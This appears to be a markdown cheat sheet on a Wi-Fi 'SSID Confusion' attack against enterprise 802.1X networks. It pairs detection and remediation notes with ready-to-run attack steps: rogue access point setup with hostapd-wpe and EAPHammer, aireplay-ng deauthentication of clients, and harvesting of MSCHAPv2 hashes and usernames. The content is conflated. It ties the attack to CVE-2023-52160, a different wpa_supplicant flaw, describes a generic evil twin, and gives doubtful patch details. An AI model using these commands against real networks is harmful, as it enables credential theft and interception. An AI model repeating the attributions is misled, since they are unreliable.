# SSID Confusion Attack (2024)

> **CVE-2023-52160**
> Paper: https://papers.mathyvanhoef.com/usenix2024-ssidconfusion.pdf
> GitHub: https://github.com/SySS-Research/ssid-confusion

## Overview

SSID Confusion discovered by **SySS Research** and **Mathy Vanhoef** (2024). Exploits a weakness in **Enterprise Wi-Fi (802.1X)** where the client **does not verify the SSID** during the authentication process.

**Impact:**
- **Force downgrade** enterprise connections to a different network
- **Credential interception** on WPA2/WPA3 Enterprise
- **MITM attack** on corporate networks
- Affects **all OSes** (Windows, macOS, Linux, iOS, Android)

---

## Attack Principle

### The Problem
1. Client sends **EAP Identity** (username) to an **unknown** network
2. **Server certificate is not validated against SSID**
3. **RADIUS server** accepts credentials from the wrong network

### Attack Flow
```
1. Attacker monitors enterprise network (SSID: "CorpWiFi")
2. Client searches for known network ("CorpWiFi")
3. Attacker broadcasts beacon with SAME SSID but different BSSID
4. Client connects to attacker's AP (with different RADIUS server)
5. Client sends credentials to attacker's RADIUS
6. Attacker receives credentials (or relays to real server)
```

---

## Tools & Usage

### SSID Confusion Tool (SySS Research)

```bash
# Install
git clone https://github.com/SySS-Research/ssid-confusion
cd ssid-confusion
sudo python3 setup.py install

# Setup evil twin enterprise
python3 ssid-confusion.py --interface wlan0 --target "CorpWiFi" --rogue-radius

# With freeradius-wpe
python3 ssid-confusion.py --interface wlan0 --target "CorpWiFi" \
    --radius-log /var/log/freeradius/inner-tunnel.log

# Combined with eaphammer
python3 ssid-confusion.py --interface wlan0 --target "CorpWiFi" \
    --eaphammer --channel 6
```

### EAPHammer Integration

```bash
# Create evil twin with the same SSID name
eaphammer -i wlan0 --channel 6 --auth wpa-eap --essid "CorpWiFi" \
    --creds --captive-portal

# Monitor log for credentials
tail -f /var/log/freeradius/freeradius-wpe.log
```

### Scapy Detection

```python
from scapy.all import *

def detect_ssid_confusion(pcap):
    ssids = {}
    for pkt in PcapReader(pcap):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt.info.decode()
            bssid = pkt.addr2
            if ssid not in ssids:
                ssids[ssid] = []
            ssids[ssid].append(bssid)

    for ssid, bssids in ssids.items():
        if len(bssids) > 1:
            print(f"[!] Multiple BSSIDs for SSID '{ssid}':")
            for b in bssids:
                print(f"    - {b}")
```

---

## SSID Confusion Types

### 1. SSID Collision
- Multiple APs with the **same SSID** but **different BSSID**
- Client cannot distinguish real vs fake network
- **Impact:** Zero-day on all OSes

### 2. Domain Suffix Spoofing
- SSIDs like `CorpWiFi` vs `CorpWiFi.evil.com`
- Client can be confused
- **Impact:** Credential leak

### 3. Enterprise Downgrade
- Force client to WPA2-PSK from WPA3-SAE
- Capture handshake and crack
- **Impact:** Offline dictionary attack

---

## Exploitation Steps

### Step 1: Monitoring
```bash
# Capture enterprise network
airodump-ng --band a -w corp_capture mon0
# Identify SSID, channel, BSSID
```

### Step 2: Rogue AP Setup
```bash
# hostapd-wpe configuration
interface=wlan1
driver=nl80211
ssid=CorpWiFi
channel=6
hw_mode=g
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
radius_server_clients=/etc/hostapd-wpe/hostapd-wpe.radius_clients
radius_server_auth_port=1812
```

### Step 3: Deauth Client
```bash
# Kick client from the real network
aireplay-ng --deauth 5 -a <BSSID_CORP> -c <CLIENT_MAC> mon0
```

### Step 4: Credential Capture
```bash
# Monitor hostapd-wpe log
tail -f /tmp/hostapd-wpe.log
# Capture: MSCHAPv2 hash, username
```

---

## Detection

### Wireshark
```
wlan.ssid == "CorpWiFi"
wlan.bssid != <known_bssid>
eap.code == 2  # EAP Response
```

### Enterprise WIPS
```
Alert: Rogue AP detected
Alert: Multiple SSID collision
Alert: Unfamiliar BSSID for known SSID
```

### NAC (Network Access Control)
- Certificate pinning
- SSID-to-certificate binding
- Posture assessment

---

## Remediation

### 1. Certificate Validation
```
# In supplicant config (wpa_supplicant)
network={
    ssid="CorpWiFi"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="user@corp.com"
    password="password"
    ca_cert="/etc/ssl/certs/corp-ca.crt"
    domain_suffix_match="corp.com"
    # or
    subject_match="radius.corp.com"
}
```

### 2. Always-On VPN
- Even if connected to wrong Wi-Fi, VPN remains active
- Zero-trust network access

### 3. PMF (802.11w) + WPA3-Enterprise
- Encrypt management frames
- Prevent deauth-based SSID switching

### 4. Certificate Pinning
- Pin certificate to OS/MDM
- Validate chain of trust

---

## Patch Status

| OS | Status | Notes |
|----|--------|-------|
| Windows 11 | ⚠️ Pending | KB5033375 update |
| macOS 14 | ⚠️ Partial | Sonoma security update |
| iOS 17 | ✅ Patched | 17.3+ |
| Android 14 | ✅ Patched | 2024-01 security patch |
| Linux (wpa_supplicant) | ✅ Patched | 2.10+ |

---

## References

- **Paper (USENIX 2024):** https://papers.mathyvanhoef.com/usenix2024-ssidconfusion.pdf
- **GitHub (SySS):** https://github.com/SySS-Research/ssid-confusion
- **Presentation:** https://www.usenix.org/conference/usenixsecurity24/presentation/peverini
- **CVE-2023-52160:** https://nvd.nist.gov/vuln/detail/CVE-2023-52160
